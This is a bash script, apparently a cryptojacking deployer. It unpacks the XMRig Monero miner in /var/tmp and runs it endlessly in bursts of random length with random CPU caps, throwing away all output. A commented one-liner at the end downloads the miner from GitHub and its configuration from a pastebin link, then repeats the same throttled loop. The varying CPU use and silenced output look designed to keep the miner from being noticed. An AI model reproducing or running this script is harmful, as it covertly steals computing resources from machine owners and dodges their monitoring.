#!/bin/bash
#chmod 777 /var/tmp/xmrig 
cd /var/tmp 
tar -xvf xmrig
cp xmrig-6.14.0/xmrig xmrig
t_min=60
t_max=300
cpu_min=5
cpu_max=26
chmod 777 xmrig
while true :
  do
    t=$(($t_min + $RANDOM % ($t_max - $t_min)))
    cpu=$(($cpu_max + $t * ($cpu_min - $cpu_max)/($t_max - $t_min)))
    cat config.json |jq -r --arg cpu "$cpu" '."max-cpu-usage"=$cpu' > u.json 
    echo $cpu
    mv u.json config.json 
    timeout $t ./xmrig -c config.json > /dev/null 2>&1
    sleep $t
done

# TODO: Optimize (takk håvar)

#!/bin/sh
#curl -o /var/tmp/xmrig -L https://github.com/xmrig/xmrig/releases/download/v6.14.0/xmrig-6.14.0-linux-x64.tar.gz;curl -o /var/tmp/config.json https://pastebin.com/raw/yFNigSAC;chmod 777 /var/tmp/xmrig;cd /var/tmp;tar -xvf xmrig;cp xmrig-6.14.0/xmrig ./xmrig;t_min=600;t_max=3600;cpu_min=5;cpu_max=30;while true;do t=$(($t_min + $RANDOM % ($t_max - $t_min)));cpu=$(($cpu_max + $t * ($cpu_min - $cpu_max)/($t_max - $t_min)));timeout $t ./xmrig -c config.json --cpu-max-threads-hint=$cpu > /dev/null 2>&1;sleep $t;done